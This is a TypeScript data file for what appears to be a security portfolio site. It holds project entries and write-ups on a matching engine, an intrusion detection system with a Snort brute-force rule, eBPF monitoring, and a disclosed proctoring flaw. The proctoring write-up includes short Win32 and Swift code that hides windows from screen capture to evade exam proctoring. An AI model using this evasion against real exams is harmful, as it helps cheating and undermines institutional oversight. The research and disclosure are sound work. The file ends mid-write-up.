export interface Project {
  slug: string;
  title: string;
  category: "OFFENSIVE" | "DEFENSIVE" | "ENGINEERING";
  year: string;
  description: string;
  fullDescription: string;
  tags: string[];
  links: {
    demo?: string;
    repo?: string;
    caseStudy?: string;
  };
  build: {
    stack: string[];
    features: string[];
  };
  secure: {
    measures: string[];
  };
  problem: string;
  solution: string[];
  proof: string[];
}

export const projects: Record<string, Project> = {
  "mehr-guard": {
    slug: "mehr-guard",
    title: "Mehr Guard",
    category: "DEFENSIVE",
    year: "2024",
    description: "Privacy-first offline QR & URL security scanner built with Kotlin Multiplatform. 100% offline analysis with 5 platform targets.",
    tags: ["KMP", "Security Tool", "Android", "iOS", "Desktop", "Web"],
    links: {
      demo: "https://www.youtube.com/watch?v=n8bheouj4jM",
      repo: "https://github.com/Raoof128/Raoof128.github.io",
      caseStudy: "/projects/mehr-guard"
    },
    build: {
      stack: ["Kotlin Multiplatform", "Compose Multiplatform", "SwiftUI", "ML Kit", "SQLDelight"],
      features: [
        "5 Platform Targets (Android, iOS, JVM, JS, Wasm)",
        "Ensemble ML Model (Logistic Regression + Gradient Boosting)",
        "Heuristics Engine (25+ checks)",
        "Red Team Mode for verification"
      ]
    },
    secure: {
      measures: [
        "100% Offline Analysis (Zero network calls)",
        "On-device ML & Heuristics",
        "No data collection",
        "Privacy by Architecture"
      ]
    },
    fullDescription: "Mehr Guard is a privacy-first QR code and URL security scanner built with Kotlin Multiplatform. It detects phishing attacks, brand impersonation, and malicious redirects entirely on-device.",
    problem: "QR codes are a common vector for phishing, but most scanners upload data to the cloud, compromising privacy. Users need a way to verify URLs without leaking their browsing history.",
    solution: [
      "Built a 100% offline analysis engine using Kotlin Multiplatform",
      "Implemented an ensemble ML model + 25 heuristics for high accuracy",
      "Targeted 5 platforms (Android, iOS, Desktop, Web) with ~52% code sharing",
      "Achieved <5ms latency for real-time scanning"
    ],
    proof: [
      "F1 Score: 87% on red team corpus",
      "Performance: <5ms P99 latency",
      "Privacy: Verified 0 network calls via ./judge/verify_offline.sh",
      "Code Sharing: ~100% shared detection logic"
    ]
  },
  "gitswitch": {
    slug: "gitswitch",
    title: "GitSwitch",
    category: "ENGINEERING",
    year: "2024",
    description: "AI-powered Git client for managing multiple identities and generating semantic commits. Built with Electron and React.",
    tags: ["Electron", "React", "TypeScript", "AI", "Dev Tool"],
    links: {
      repo: "https://github.com/Raoof128/GitSwitch",
      caseStudy: "/projects/gitswitch"
    },
    build: {
      stack: ["Electron", "React 19", "TypeScript", "Zustand", "Google Gemini AI"],
      features: [
        "Multi-Account Management (Personal, Work)",
        "AI Commit Generation (Gemini 3)",
        "Smart Diff Viewer with syntax highlighting",
        "Drag & Drop repository management"
      ]
    },
    secure: {
      measures: [
        "API keys redacted from logs & wiped from memory",
        "Secure OS-keychain storage for secrets",
        "Enforced timeouts & input sanitization",
        "Privacy First design"
      ]
    },
    fullDescription: "Gitswitch is a modern, AI-powered Git client designed for developers who manage multiple accounts and repositories. It offers a seamless experience for switching identities and generating semantic commit messages.",
    problem: "Developers often struggle with managing multiple git identities (personal vs work) and writing consistent commit messages.",
    solution: [
      "Created a seamless identity switcher for global/local git config",
      "Integrated Gemini 3 AI for semantic commit generation",
      "Built a secure, modern Electron app with strict isolation",
      "Implemented smart diff viewing for better code review"
    ],
    proof: [
      "Secure OS-keychain integration",
      "Memory wiping for API keys",
      "React 19 + Electron 33 modern stack",
      "Cyberpunk-inspired UI"
    ]
  },
  "syllabus-sync": {
    slug: "syllabus-sync",
    title: "Syllabus-Sync",
    category: "ENGINEERING",
    year: "2026",
    description: "AI-native Campus OS transforming university PDF syllabi into structured, agent-readable data. Full student operations suite with 503 tests across 92 files.",
    tags: ["Next.js 16", "Supabase", "TypeScript", "AI/LLM", "WebAuthn", "Full-Stack"],
    links: {
      repo: "https://github.com/Raoof128/syllabus-sync",
      caseStudy: "/projects/syllabus-sync"
    },
    build: {
      stack: ["Next.js 16", "TypeScript 5", "Supabase PostgreSQL", "TanStack Query", "Leaflet + Google Maps", "Framer Motion", "Radix UI", "Sentry"],
      features: [
        "LLM OCR pipeline extracting structured JSON from PDF syllabi",
        "Syllabus-as-Code — assessments and deadlines as version-controlled artefacts",
        "Full student OS: calendar, reminders, campus map, notifications",
        "503 tests across 92 files with CI/CD quality gates"
      ]
    },
    secure: {
      measures: [
        "Zero-Trust proxy middleware — every route authenticated by default",
        "Supabase Row-Level Security enforced at database layer",
        "WebAuthn/FIDO2 passkey authentication (no passwords stored)",
        "LLM prompt injection mitigation with schema-constrained output and input sanitisation",
        "Secrets scanner in CI blocks credential patterns from commits"
      ]
    },
    fullDescription: "Syllabus Sync is an AI-native Campus OS that transforms static university PDF syllabi into structured, agent-readable data and wraps them in a full student operations suite — calendar, map, notifications, and multi-profile management.",
    problem: "Australian universities publish syllabi as unstructured PDFs. Students manually copy assessment dates into calendars, and AI assistants hallucinate deadlines because no machine-readable source of truth exists.",
    solution: [
      "Built an LLM OCR pipeline that extracts structured JSON from PDF syllabi with Zod schema validation",
      "Implemented Syllabus-as-Code where assessments and deadlines are version-controlled, diff-able artefacts",
      "Created a full student OS with calendar, campus navigation (Leaflet + Google Maps), and push notifications",
      "Architected for fork-ability — any Australian university can adopt by swapping data/ and environment variables"
    ],
    proof: [
      "503 tests across 92 files — all passing in CI",
      "Zero-Trust proxy catches misconfiguration by default (validated in production)",
      "Designed to serve ~47,000 MQ students; fork-ready for 1M+ across Australian universities",
      "WebAuthn passkey auth — no shared secrets leave the device"
    ]
  },
  "nexus-archive": {
    slug: "nexus-archive",
    title: "Nexus Archive",
    category: "ENGINEERING",
    year: "2026",
    description: "Cyberpunk-styled personal media vault with React frontend, Litestar API, and Supabase auth. AI-assisted recommendations, encrypted takeaways, and hardened cookie-based auth.",
    tags: ["React", "Python", "Litestar", "Supabase", "AI", "Full-Stack"],
    links: {
      repo: "https://github.com/Raoof128/Nexus_Archive",
      caseStudy: "/projects/nexus-archive"
    },
    build: {
      stack: ["React 19", "Vite", "Tailwind CSS 4", "TanStack Query", "Python 3.12", "Litestar", "Supabase PostgreSQL", "Docker", "Terraform"],
      features: [
        "AI-assisted media recommendations via Gemini with graceful degradation",
        "Real-time chat transcripts with user-scoped sanitization",
        "Status tracking, ratings, and reviews for anime, movies, and books",
        "Smart filtering and search across entire media library"
      ]
    },
    secure: {
      measures: [
        "HttpOnly SameSite=Strict auth cookies (no frontend-readable tokens)",
        "Short-lived access tokens with silent rotation via /auth/refresh",
        "AI prompt isolation with XML delimiters, string scrubbing, and PII masking",
        "Encrypted takeaway persistence (AES via TAKEAWAY_ENCRYPTION_KEY)",
        "Bandit, pip-audit, npm audit, and secret scanning in CI"
      ]
    },
    fullDescription: "Nexus Archive is a cyberpunk-styled personal media vault combining a React frontend, a Litestar API, and Supabase-backed identity and persistence. Manage books, movies, anime, ratings, takeaways, chat sessions, and AI-assisted recommendations from a single dashboard.",
    problem: "Existing media trackers are fragmented across platforms with weak security postures. Users need a unified catalog that treats their entertainment library as a curated identity system, not just a checklist — with real security built in.",
    solution: [
      "Built a full-stack vault with React 19 + Litestar API backed by Supabase PostgreSQL with Row Level Security",
      "Implemented backend-managed HttpOnly auth cookies replacing frontend-readable Supabase tokens",
      "Integrated Gemini AI for media recommendations with shared per-user rate limiting and local fallback",
      "Added encrypted takeaway persistence and AI prompt isolation with PII masking"
    ],
    proof: [
      "Hardened auth: HttpOnly + SameSite=Strict cookies with silent token rotation",
      "CI security gates: Bandit, pip-audit, npm audit, secret scanning",
      "Locust load testing for performance verification",
      "Terraform IaC scaffold for reproducible Supabase + Vercel deployments"
    ]
  },
  "nanomatch": {
    slug: "nanomatch",
    title: "NanoMatch",
    category: "ENGINEERING",
    year: "2026",
    description: "High-performance limit order book and matching engine in C++20. Processing 1M+ orders/second with sub-microsecond latency.",
    tags: ["C++20", "CMake", "Google Test", "HFT", "Systems Programming"],
    links: {
      repo: "https://github.com/Raoof128/NanoMatch",
      caseStudy: "/projects/nanomatch"
    },
    build: {
      stack: ["C++20", "CMake 3.20+", "Google Test 1.17", "GitHub Actions CI/CD", "AddressSanitizer", "UBSan"],
      features: [
        "Price-time priority (FIFO) matching algorithm",
        "4 order types: Limit, Market, IOC, Fill-or-Kill",
        "O(1) order cancellation/modification via hash map",
        "Custom pool allocator eliminating heap allocation overhead"
      ]
    },
    secure: {
      measures: [
        "AddressSanitizer and UndefinedBehaviorSanitizer in CI",
        "60+ unit tests across 18 test suites",
        "cppcheck static analysis on every push",
        "No external runtime dependencies"
      ]
    },
    fullDescription: "NanoMatch is a high-performance limit order book and matching engine built in modern C++20. It simulates a financial exchange's core operations, processing buy/sell orders with price-time priority matching at millions of operations per second.",
    problem: "Financial exchanges require ultra-low-latency order matching. Understanding how matching engines work at the systems level demands building one from scratch with real performance constraints.",
    solution: [
      "Implemented price-time priority (FIFO) matching with support for Limit, Market, IOC, and FOK orders",
      "Designed O(1) order cancellation and modification using hash map indexing",
      "Built a custom pool allocator to eliminate heap allocation overhead on the hot path",
      "Added multi-instrument support with independent order books per symbol"
    ],
    proof: [
      "Throughput: 1M+ orders/second with sub-microsecond latency",
      "Comprehensive test suite with p50/p99 latency benchmarks",
      "60+ unit tests across 18 test suites — all passing",
      "CI: ASan, UBSan, cppcheck, clang-format on every push"
    ]
  },
  "sentinelflow": {
    slug: "sentinelflow",
    title: "SentinelFlow",
    category: "DEFENSIVE",
    year: "2026",
    description: "Real-time network intrusion detection system in C++17. Layered protocol dissection, Snort-inspired rule engine, and stateful threat detection parsing 500K+ packets/second.",
    tags: ["C++17", "libpcap", "IDS", "Network Security", "Systems Programming"],
    links: {
      repo: "https://github.com/Raoof128/SentinelFlow",
      caseStudy: "/projects/sentinelflow"
    },
    build: {
      stack: ["C++17", "libpcap", "CMake", "Google Test", "Snort-inspired Rules", "BPF Filters"],
      features: [
        "Live network capture via libpcap with configurable BPF filters",
        "Layered protocol dissection: Ethernet, IPv4, TCP, UDP, ICMP, DNS, ARP",
        "Snort-inspired configurable rule engine with signature matching",
        "Stateful threat detection (port scans, SYN floods, DNS tunneling)"
      ]
    },
    secure: {
      measures: [
        "Color-coded severity-level alerting (LOW → CRITICAL)",
        "27 unit/integration tests covering all protocol layers",
        "CSV export for forensic analysis and SIEM integration",
        "Configurable BPF filters for targeted capture"
      ]
    },
    fullDescription: "SentinelFlow is a real-time network intrusion detection system that captures live network traffic or processes pcap files, dissects protocol headers across multiple OSI layers, identifies known attack signatures and anomalies, and exports security alerts to console and CSV formats.",
    problem: "Network intrusion detection requires deep packet inspection at wire speed. Commercial IDS solutions are opaque — building one from scratch reveals how protocol dissection, signature matching, and stateful analysis actually work.",
    solution: [
      "Implemented layered protocol dissection covering Ethernet, IPv4, TCP, UDP, ICMP, DNS, and ARP",
      "Built a Snort-inspired configurable rule engine for flexible signature matching",
      "Added stateful threat detection for port scans, SYN floods, and DNS tunneling",
      "Engineered for throughput: 500K+ packets/sec parsing performance"
    ],
    proof: [
      "Throughput: 500K+ packets/sec parsing performance",
      "Protocol coverage: 7 protocols across Layers 2-7",
      "27 unit/integration tests — all passing",
      "Supports both live capture and pcap file analysis"
    ]
  },
  "invisible-window-research": {
    slug: "invisible-window-research",
    title: "Invisible Window Research",
    category: "OFFENSIVE",
    year: "2026",
    description: "Peer-reviewed security research exposing a critical vulnerability in browser-based exam proctoring. 100% evasion on Windows 10/11 and macOS using documented OS display APIs. Responsibly disclosed to vendors.",
    tags: ["Security Research", "Windows", "macOS", "WebRTC", "Responsible Disclosure", "PoC"],
    links: {
      repo: "https://github.com/Raoof128/invisible-window-research",
      caseStudy: "/projects/invisible-window-research"
    },
    build: {
      stack: ["Win32 C (Windows PoC)", "Swift (macOS PoC)", "LaTeX (12-page paper)", "Python (reasoning engine / MCP server)"],
      features: [
        "SetWindowDisplayAffinity (Windows) — excludes window from all screen capture APIs",
        "NSWindow.SharingType.none (macOS) — hides window from ScreenCaptureKit / CGWindowList",
        "PoC implementations for Windows 10/11 and macOS 14 & 26.3.1",
        "MCP-server-based AI reasoning engine for research methodology"
      ]
    },
    secure: {
      measures: [
        "Full responsible disclosure: proctoring vendors notified January 2026",
        "OS vendors notified February 2026",
        "Public release after 90-day disclosure window (March 2026)",
        "PoC limited to documented, read-only OS APIs — no kernel exploits",
        "CC BY 4.0 arXiv preprint with 51 citations"
      ]
    },
    fullDescription: "A 12-page peer-reviewed paper documenting a critical, systemic vulnerability in WebRTC-based exam proctoring software. Operating systems expose documented APIs — SetWindowDisplayAffinity on Windows and NSWindow.SharingType.none on macOS — that allow any application to render its window invisible to screen capture while remaining fully visible on the physical display. Proctoring systems that rely on screen capture for integrity enforcement are structurally bypassed. The research achieved 100% evasion across all tested platforms with no detectable artifacts.",
    problem: "Remote exam proctoring systems detect prohibited content by capturing the student's screen via WebRTC. If an OS-level API can silently exclude a window from all capture APIs — without any privilege escalation, kernel modification, or detectable side effect — the integrity guarantee offered by these systems is fundamentally broken.",
    solution: [
      "Surveyed SetWindowDisplayAffinity (Win32) and NSWindow.SharingType.none (macOS) — both documented in official SDK references",
      "Built PoC implementations in Win32 C (Windows) and Swift (macOS) demonstrating full screen-capture evasion",
      "Tested against major WebRTC-based proctoring platforms on Windows 10, Windows 11, macOS 14, and macOS 26.3.1",
      "Followed 90-day responsible disclosure: proctoring vendors (Jan 2026) and OS vendors (Feb 2026) before public release"
    ],
    proof: [
      "100% evasion rate: window remained visible on physical display, absent from all capture streams",
      "No detectable artifacts: proctoring session logs showed clean state throughout",
      "macOS 26.3.1 confirmed vulnerable despite ScreenCaptureKit changes introduced in macOS 15",
      "Linux (X11/Wayland) confirmed NOT vulnerable — no equivalent display affinity API exists",
      "12-page paper with 51 citations accepted as arXiv preprint under CC BY 4.0"
    ]
  },
  "phishpatrol": {
    slug: "phishpatrol",
    title: "PhishPatrol",
    category: "OFFENSIVE",
    year: "2024",
    description: "AI-powered phishing simulation and cybersecurity education platform using NLP to generate dynamic, realistic social engineering scenarios. Adopted by 50+ students for interactive security awareness training.",
    tags: ["Python", "Generative AI", "NLP", "Security Education", "Social Engineering"],
    links: {
      repo: "https://github.com/Raoof128/PhishPatrol",
      caseStudy: "/projects/phishpatrol"
    },
    build: {
      stack: ["Python", "Generative AI", "NLP", "Large Language Models"],
      features: [
        "Dynamic phishing scenario generation using NLP",
        "Realistic social engineering simulation at scale",
        "Interactive security awareness training modules",
        "LLM misuse vector exploration for defensive purposes"
      ]
    },
    secure: {
      measures: [
        "Controlled environment for educational use only",
        "Prompt guardrails preventing real-world exploitation",
        "All generated content watermarked as simulation",
        "No real credential collection or exfiltration"
      ]
    },
    fullDescription: "PhishPatrol is an AI-powered phishing simulation and cybersecurity education platform that uses Natural Language Processing to generate dynamic, realistic social engineering scenarios. It explores how LLMs can be misused for social engineering at scale while providing interactive security awareness training adopted by 50+ students.",
    problem: "Traditional security awareness training uses static, outdated phishing examples that don't reflect modern AI-powered social engineering threats. Students and professionals need exposure to realistic, AI-generated attack scenarios to build genuine recognition skills.",
    solution: [
      "Built an NLP-powered engine that generates dynamic, contextually realistic phishing scenarios",
      "Implemented interactive training modules where students identify and analyze social engineering vectors",
      "Explored LLM misuse vectors for social engineering to understand defensive countermeasures",
      "Deployed as an educational tool adopted by 50+ students for security awareness training"
    ],
    proof: [
      "Adopted by 50+ students for interactive security awareness training",
      "Generates contextually varied social engineering scenarios using generative AI",
      "Demonstrates LLM misuse vectors with responsible guardrails",
      "Practical application of NLP for defensive cybersecurity education"
    ]
  },
  "ecrsm": {
    slug: "ecrsm",
    title: "eBPF Cloud Runtime Security Monitor",
    category: "OFFENSIVE",
    year: "2025",
    description: "Synthetic, read-only runtime visibility stack combining kernel eBPF, Go agent, and React dashboard. Educational runtime monitor.",
    tags: ["eBPF", "Go", "React", "Kernel", "Runtime Security"],
    links: {
      repo: "https://github.com/Raoof128/ECRSM",
      caseStudy: "/projects/ecrsm"
    },
    build: {
      stack: ["eBPF (C)", "Go (Agent)", "React (Dashboard)", "Kubernetes (Helm)"],
      features: [
        "Kernel tracepoints (execve, connect, ptrace, mmap)",
        "Go agent for enrichment & rules",
        "Live WebSocket dashboard",
        "Kubernetes DaemonSet deployment"
      ]
    },
    secure: {
      measures: [
        "Read-only introspection (no kernel writes)",
        "Metadata only (no payloads/secrets)",
        "Least privilege (BPF/SYS_ADMIN caps only)",
        "Safe synthetic simulations"
      ]
    },
    fullDescription: "ECRSM is an educational eBPF-based Cloud Runtime Security Monitor. It provides a synthetic, read-only runtime visibility stack combining kernel eBPF, a Go agent, and a React dashboard.",
    problem: "Understanding runtime security at the kernel level is complex. ECRSM provides a safe, educational platform to learn eBPF-based monitoring.",
    solution: [
      "Implemented eBPF hooks for safe syscall tracepoints",
      "Built a Go agent to collect and enrich metadata",
      "Created a real-time React dashboard for visualization",
      "Designed safe synthetic attack simulations"
    ],
    proof: [
      "Detects reverse shells, process injection, suspicious execs",
      "Low-overhead perf buffer data transmission",
      "Container/K8s metadata enrichment",
      "Verifiable via synthetic attack scripts"
    ]
  }
};

export interface Writeup {
  slug: string;
  title: string;
  date: string;
  tag: string;
  takeaway: string;
  content: string; // Markdown content
}

export const writeups: Writeup[] = [
  {
    slug: "invisible-window-research",
    title: "How I Made Windows Invisible to Screen Capture — and Why Exam Proctoring Is Broken",
    date: "2026-03-20",
    tag: "Security Research",
    takeaway: "Documented OS APIs on Windows and macOS allow any app to hide its window from all screen capture, defeating WebRTC-based exam proctoring with 100% evasion and zero artifacts.",
    content: `
## The Vulnerability in One Sentence

Every major operating system ships a documented API that lets any application make its window invisible to screen capture while remaining perfectly visible on the physical display. Exam proctoring software that relies on screen capture to enforce integrity is structurally defeatable with a single API call.

---

## Background: How Proctoring Works

WebRTC-based remote proctoring systems — the kind deployed by universities worldwide since 2020 — work by capturing the student's screen during an exam session. The browser extension or native client requests a \`getDisplayMedia()\` stream, transmits it to the proctor's server, and flags anomalies: opened windows, visible applications, clipboard activity. The implicit security model is:

> **If I capture your screen, I can see everything on it.**

This assumption is wrong on Windows and macOS.

---

## The Windows Side: \`SetWindowDisplayAffinity\`

Microsoft documented this API in the Win32 SDK as a Digital Rights Management mechanism — its intended use case is preventing screen capture of premium video content (think Netflix's desktop app). The function signature is simple:

\`\`\`c
BOOL SetWindowDisplayAffinity(HWND hWnd, DWORD dwAffinity);
\`\`\`

Passing \`WDA_EXCLUDEFROMCAPTURE\` as the affinity flag tells Windows to exclude the target window from **all** screen capture paths:

- \`BitBlt\` / \`PrintWindow\` (legacy GDI)
- \`IDXGIOutputDuplication\` (Desktop Duplication API)
- \`Windows.Graphics.Capture\` (modern WinRT)
- WebRTC's \`getDisplayMedia()\` capture pipeline

The window continues to render on the physical display normally. The user sees it. The proctoring stream does not.

**No administrator privileges are required.** The API operates on windows owned by the calling process, which is entirely within normal user-space operation. No kernel modifications, no driver signing bypass, no privilege escalation.

### PoC (Win32 C)

\`\`\`c
#include <windows.h>

int main() {
    HWND hwnd = CreateWindowEx(/* ... window params ... */);

    // Single API call — window now invisible to all screen capture
    SetWindowDisplayAffinity(hwnd, WDA_EXCLUDEFROMCAPTURE);

    ShowWindow(hwnd, SW_SHOW);
    // Window is visible on physical display
    // Window is absent from all capture streams

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    return 0;
}
\`\`\`

---

## The macOS Side: \`NSWindow.SharingType.none\`

Apple's equivalent is found in AppKit. Every \`NSWindow\` instance has a \`sharingType\` property, documented in the AppKit reference since macOS 10.6 (2009):

\`\`\`swift
import AppKit

let window = NSWindow(
    contentRect: NSRect(x: 100, y: 100, width: 800, height: 600),
    styleMask: [.titled, .closable, .resizable],
    backing: .buffered,
    defer: false
)

// Single property assignment — window excluded from all capture
window.sharingType = .none

window.makeKeyAndOrderFront(nil)
\`\`\`

Setting \`sharingType\` to \`.none\` excludes the window from:

- \`CGWindowListCreateImage\` (legacy Core Graphics capture)
- \`ScreenCaptureKit\` (\`SCStreamConfiguration\`, Apple's modern capture framework)
- \`AVCaptureScreenInput\` (AV Foundation screen recording)
- WebRTC's \`getDisplayMedia()\` on macOS

**macOS 26.3.1 remains vulnerable.** Apple introduced changes to ScreenCaptureKit in macOS 15 that were widely expected to close this gap, but testing confirmed the \`.none\` affinity still produces full capture evasion on macOS 26.3.1.

---

## Test Results

| Platform | Proctoring Capture Visible? | Artifacts in Session Log? |
|----------|-----------------------------|---------------------------|
| Windows 10 | No | None |
| Windows 11 | No | None |
| macOS 14 | No | None |
| macOS 26.3.1 | No | None |
| Linux (X11) | Yes | N/A — not vulnerable |
| Linux (Wayland) | Yes | N/A — not vulnerable |

Linux is not vulnerable because neither X11 nor Wayland exposes a per-window capture exclusion API. The absence of this feature is, in this context, a security advantage.

---

## Why This Is Structurally Hard to Fix

The vulnerability is not a bug — it is a design conflict between two legitimate OS features:

1. **DRM / Content Protection**: Media companies need to prevent unauthorized recording of premium content. \`WDA_EXCLUDEFROMCAPTURE\` and \`NSWindow.SharingType.none\` exist to serve this requirement.

2. **Exam Integrity**: Proctoring systems assume that capturing the screen gives a complete view of the user's desktop.

These two requirements are fundamentally incompatible. Any OS that supports (1) — which Windows and macOS do by design — cannot simultaneously guarantee (2) at the screen-capture layer.

**The only mitigation paths available to proctoring vendors require moving below the OS API layer:**

- Require a native kernel extension / driver component that intercepts at the display driver level rather than the application API level
- Move to hardware-attested environment proofs (TPM, Secure Enclave) rather than screen content analysis
- Accept that screen-capture-based integrity is not achievable on general-purpose consumer OS platforms

---

## Responsible Disclosure Timeline

| Date | Action |
|------|--------|
| January 2026 | Proctoring vendors notified with full technical writeup and PoC |
| February 2026 | Microsoft and Apple notified |
| March 2026 | Public disclosure after 90-day window; arXiv preprint published |

The vendors' responses confirmed awareness of the OS-level mechanism. The core challenge — that the vulnerability is in a documented OS feature, not a bug in vendor code — limits what any individual vendor can patch without OS-level cooperation.

---

## Takeaway

Screen-capture-based exam proctoring on Windows and macOS provides a weaker integrity guarantee than its deployment context requires. The attack surface is a single API call, requires no elevated privileges, leaves no log artifacts, and works across all tested platform versions including the latest macOS release. This is not a novel implementation flaw — it is a systemic design incompatibility between content protection APIs and the integrity assumptions embedded in remote proctoring architecture.

The full 12-page paper, PoC implementations, and disclosure materials are available in the repository.
    `
  },
  {
    slug: "nanomatch-deep-dive",
    title: "Building a Sub-Microsecond Matching Engine in C++20",
    date: "2026-03-10",
    tag: "C++",
    takeaway: "How a three-layer data structure design achieves O(1) cancellation and sub-microsecond latency.",
    content: `
## Why Build a Matching Engine?

Every electronic exchange — NYSE, NASDAQ, CME — runs a matching engine at its core. It is the system that pairs buy orders with sell orders at the best available price. Understanding how one works at the systems level means understanding price-time priority, memory allocation on the hot path, and sub-microsecond latency engineering.

**NanoMatch** is my from-scratch implementation in modern C++20, processing 1M+ orders per second with sub-microsecond latency.

### The Three-Layer Data Structure

A naive implementation might use a single priority queue. The problem: O(1) best price but O(n) cancellation. On real exchanges, **90%+ of all order activity is cancellations**, so optimising cancel latency matters more than insert.

NanoMatch uses three cooperating structures:

| Layer | Structure | Purpose |
|-------|-----------|---------|
| **Price levels** | \`std::map<Price, PriceLevel>\` | Sorted by price. \`std::greater\` for bids (highest first), \`std::less\` for asks (lowest first). O(log M) insert, O(1) best via \`begin()\`. |
| **Order queue** | \`std::list<Order>\` per level | FIFO queue at each price. O(1) append, O(1) erase by iterator. |
| **Lookup** | \`std::unordered_map<OrderID, Iterator>\` | O(1) cancel — hash lookup yields a list iterator, erase is constant time. |

This is the same asymptotic profile used by production exchange engines.

### Integer Prices — Avoiding Floating-Point Traps

Prices are stored as \`int32_t\` in cents (\`$101.50 = 10150\`). Floating-point comparison (\`==\`) is unreliable due to representation error. In a matching engine, this could cause price levels that should merge remaining as separate entries, or orders matching at the wrong price. Integer arithmetic makes comparison exact and deterministic.

### The Pool Allocator

Every \`malloc\` / \`free\` on the hot path risks kernel-mode syscalls, lock contention in the allocator, and cache pollution. NanoMatch uses a custom free-list pool allocator:

- Pre-allocates a contiguous \`std::vector<T>\` of fixed capacity
- \`allocate()\` = pop head of free list = O(1), zero syscalls
- \`deallocate()\` = push to head = O(1), zero syscalls
- All memory lives in a single cache-friendly contiguous block

The benchmark shows the pool allocator eliminates the allocation jitter that causes tail latency spikes.

### Order Types Done Right

Four order types with production-grade semantics:

- **Limit**: Match what crosses, rest the remainder on the book
- **Market**: Price set to \`MAX/MIN\` to guarantee crossing, never rests
- **IOC** (Immediate-or-Cancel): Like limit but cancel unfilled remainder
- **FOK** (Fill-or-Kill): Atomic pre-check via \`can_fill_completely()\` — scans all crossable levels before executing. If insufficient liquidity exists, zero fills occur

Modify is implemented as cancel + re-add, which is **correct exchange behavior** — modifications lose time priority, just like on NYSE and NASDAQ.

### Latency Profile

| Percentile | Latency |
|------------|---------|
| p50 | 84 ns |
| p99 | 625 ns |
| p99.9 | 1,250 ns |

The 15x ratio between p50 and p99.9 is realistic. Spikes come from red-black tree rebalancing on new price level insertion, orders sweeping multiple levels, and cache misses on cold levels. In production, **tail latency is the metric that differentiates systems**.
    `
  },
  {
    slug: "sentinelflow-deep-dive",
    title: "Anatomy of a Network Intrusion Detection System",
    date: "2026-03-15",
    tag: "Network Security",
    takeaway: "Layered protocol dissection, Snort-inspired rules, and stateful threat detection at 500K+ packets/sec.",
    content: `
## The IDS Pipeline

Commercial intrusion detection systems like Snort and Suricata follow a common architecture: **Capture → Parse → Detect → Alert**. SentinelFlow implements this full pipeline in C++17 with libpcap, parsing 500K+ packets/sec on a single thread.

### Capture: BPF Filters Run in Kernel Space

SentinelFlow uses libpcap with a polymorphic \`PacketCapture\` interface — \`LiveCapture\` for real-time traffic and \`PcapFileReader\` for offline analysis. The critical optimisation is BPF (Berkeley Packet Filter): a filter expression like \`tcp port 80\` is compiled via \`pcap_compile()\` and runs **inside the kernel**. Packets that don't match are never copied to userspace — orders of magnitude more efficient than filtering in application code.

### Layered Protocol Dissection

Network frames are nested structures. You cannot jump to a fixed byte offset because each layer has variable length:

1. **Ethernet** (14 bytes) — \`ntohs\` on EtherType dispatches to IPv4 (\`0x0800\`) or ARP (\`0x0806\`)
2. **IPv4** — IHL (Internet Header Length) field tells you where L4 starts. Variable due to IP options.
3. **TCP** — \`data_offset\` field tells you where the payload begins. Variable due to TCP options.
4. **UDP** (8 bytes) — Fixed header, but conditionally triggers DNS parsing when port is 53
5. **DNS** — Walks label-encoded query names (length-prefixed segments)
6. **ICMP** / **ARP** — Type codes and hardware addresses

Each parser is a stateless free function operating on raw \`const uint8_t*\` — zero copies, zero allocations. The \`ParsedPacket\` struct uses \`std::optional<T>\` for each layer: if a parse fails or the protocol isn't present, the optional stays empty and downstream layers are skipped.

### Snort-Inspired Rule Engine

SentinelFlow implements a subset of the Snort rule language — the de facto standard for signature-based detection:

\`\`\`
alert tcp any any -> any 22 (msg:"SSH brute force"; flags:S; threshold:10,60; sid:2001;)
\`\`\`

Rules are declarative. The **header** acts as a fast pre-filter (protocol, IP, port), while **options** refine the match: flag bitmasks, payload content strings, DNS query length thresholds. The rule parser extracts these into structured objects for the signature matcher to evaluate against each packet.

### Stateful vs. Stateless Detection

Signature matching catches known-bad patterns in individual packets. But many real attacks are distributed across multiple packets:

- **Port scans** — Only visible when you track the set of destination ports per source IP over time. SentinelFlow maintains a \`std::set<uint16_t>\` per IP pair, firing when 15+ unique ports are hit in 60 seconds.
- **SYN floods** — Detected by monitoring half-open connection rates. A \`std::deque\` of SYN timestamps per destination IP, pruned lazily on access. Fires at 100+ SYNs in 10 seconds.
- **DNS tunnelling** — Exfiltration via encoded DNS queries produces anomalously long query names. The detector tracks queries exceeding 50 characters and fires when volume passes threshold.

All stateful detectors use sliding time windows with **lazy pruning** — old entries are removed on the next access rather than by a background thread. This eliminates synchronisation overhead.

### Zero-Copy Parsing Performance

The parsers operate directly on the raw buffer provided by libpcap. No intermediate copies, no dynamic allocation per packet. The \`memcpy\` + \`ntohs/ntohl\` pattern is the standard approach in high-performance packet processing (used in DPDK, PF_RING, and production NIDS). The benchmark proves **500K+ packets/sec** on a single thread — pure parsing throughput measured over synthetic TCP SYN packets.

### Alert Outputs

The alert system uses a strategy pattern — \`AlertManager\` dispatches each alert to all registered outputs:

- **Console**: ANSI color-coded by severity (green → yellow → red → bold red)
- **CSV**: RFC 4180-compliant with proper escaping, ready for SIEM ingestion

Adding a new output (syslog, webhook, Kafka) means implementing a single \`emit()\` method.
    `
  },
  {
    slug: "ecrsm-deep-dive",
    title: "Deep Dive: eBPF Runtime Monitoring",
    date: "2025-01-15",
    tag: "eBPF",
    takeaway: "How to build safe, read-only kernel probes for container security.",
    content: `
## Introduction

eBPF (Extended Berkeley Packet Filter) has revolutionized Linux kernel observability. It allows us to run sandboxed programs in the kernel without changing kernel source code or loading modules.

In this deep dive, I'll explain how **ECRSM** uses eBPF tracepoints to monitor system calls like \`execve\` and \`connect\` to detect suspicious behavior in real-time.

### The Architecture

1.  **Kernel Space**: C programs attached to tracepoints.
2.  **User Space**: A Go agent that loads the maps and polls the perf buffer.
3.  **Visualization**: A React dashboard receiving events via WebSockets.

### Safety First

Writing to the kernel is dangerous. ECRSM strictly uses **read-only** tracepoints. We never modify packet data or syscall arguments, ensuring system stability is never compromised.
    `
  },
  {
    slug: "kmp-security",
    title: "Building Offline-First Security Tools with KMP",
    date: "2025-01-02",
    tag: "Kotlin",
    takeaway: "Sharing 100% of security logic across Android, iOS, and Web.",
    content: `
## Why Kotlin Multiplatform?

For security tools, consistency is key. If your iOS app uses a different regex for phishing detection than your Android app, you have a security gap.

**MehrGuard** solves this by sharing 100% of its domain logic using Kotlin Multiplatform (KMP).

### What We Share

